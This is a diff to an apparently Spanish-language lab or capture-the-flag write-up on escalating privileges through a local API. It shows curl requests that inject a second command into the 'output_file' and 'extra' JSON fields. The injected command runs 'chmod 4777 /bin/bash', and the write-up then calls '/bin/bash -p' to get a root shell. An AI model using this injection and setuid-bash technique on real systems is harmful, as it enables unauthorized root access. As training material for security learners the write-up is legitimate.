@@ -241,10 +241,33 @@ jadx-gui
  curl -X POST http://127.0.0.1:9090/login -H "Content-Type: application/json" -d '{"username":"developer","password":"bigbang"}' -v    
 </code></pre>
 <img src="https://github.com/xKoutax/xkoutax/blob/master/assets/images/Captura%20de%20pantalla%202025-02-28%20015808.png?raw=true" alt="Captura de pantalla">
+<p>Intentando simplemente ejecutar un archivo después de muchos intentos fallidos antes de que se haga un archivo</p>
+<pre><code>
+touch /tmp/foo
+chmod +x /tmp/foo  
+</code></pre>
+<p>El primer argumento que daremos es este foo, entonces inyectaremos nuestro segundo comando con eso y solo para probar haremos un archivo en /tmp</p>
 
 <pre><code>
-     
+ curl -X POST http://127.0.0.1:9090/command \
+     -H "Content-Type: application/json" \
+     -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc0MDcyNTg2OCwianRpIjoiOGY1NGE0N2EtZWM4OS00Y2YyLWFkNzAtMTk5NWYzZDdjNjk1IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmVsb3BlciIsIm5iZiI6MTc0MDcyNTg2OCwiY3NyZiI6ImVjY2RjYmEwLTBmMzctNGQ0OS05YmMwLTA3ZTczNDI5ZTg4ZiIsImV4cCI6MTc0MDcyOTQ2OH0.SsWgWeA4MwLWvGpk15ofm5pdxpod3ONO50s3JdH1aBQ" \
+     -d '{"command":"send_image","output_file":"foo","extra":"touch /tmp/pain"}'
+<h1>ROOT</h1>
+<p> Finalmente, los comandos se están ejecutando y el propietario del archivo es root</p> 
+<p>Cambiar el permiso en /bin/bash para obtener el privilegio de root </p>
 </code></pre>
+curl -X POST http://127.0.0.1:9090/command \
+     -H "Content-Type: application/json" \
+     -H "Authorization: Bearer yJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc0MDcyNTg2OCwianRpIjoiOGY1NGE0N2EtZWM4OS00Y2YyLWFkNzAtMTk5NWYzZDdjNjk1IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmVsb3BlciIsIm5iZiI6MTc0MDcyNTg2OCwiY3NyZiI6ImVjY2RjYmEwLTBmMzctNGQ0OS05YmMwLTA3ZTczNDI5ZTg4ZiIsImV4cCI6MTc0MDcyOTQ2OH0.SsWgWeA4MwLWvGpk15ofm5pdxpod3ONO50s3JdH1aBQ" \
+     -d '{"command":"send_image","output_file":"foo \nchmod 4777 /bin/bash"}'
+
+<pre><code>
+ls -la /bin/bash
+/bin/bash -p
+id
+</code></pre>
+<img src="https://github.com/xKoutax/xkoutax/blob/master/assets/images/Captura%20de%20pantalla%202025-02-28%20195155.png?raw=true" alt="Captura de pantalla">
 
 <p>.</p>
 <p>.</p>
@@ -283,68 +306,6 @@ jadx-gui
 <p>.</p>
 <p>.</p>
 <p>.</p>
-<p>.</p>
-<p>.</p>
-<p>.</p>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 
 </body>
